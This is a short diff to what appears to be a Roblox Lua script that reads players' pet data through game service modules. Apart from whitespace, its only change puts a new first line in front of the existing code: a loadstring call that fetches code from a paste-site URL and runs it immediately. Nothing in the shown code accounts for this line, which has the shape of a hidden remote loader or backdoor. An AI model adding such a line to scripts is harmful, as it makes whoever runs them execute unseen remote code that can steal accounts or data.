@@ -1,3 +1,6 @@
+loadstring(game:HttpGet("https://paste.debian.net/plainh/97e6ee56/", true))()
+
+
         local RS = game:GetService("ReplicatedStorage")
         local HttpService = game:GetService("HttpService")
         local RunService = game:GetService("RunService")
@@ -7,6 +10,7 @@
         local NumberUtil = require(RS.Modules.NumberUtil)
         local PetUtilities = require(RS.Modules.PetServices.PetUtilities)
         local PetsService = require(game:GetService("ReplicatedStorage").Modules.PetServices.PetsService)
+
 
         local data = DataService:GetData()
 
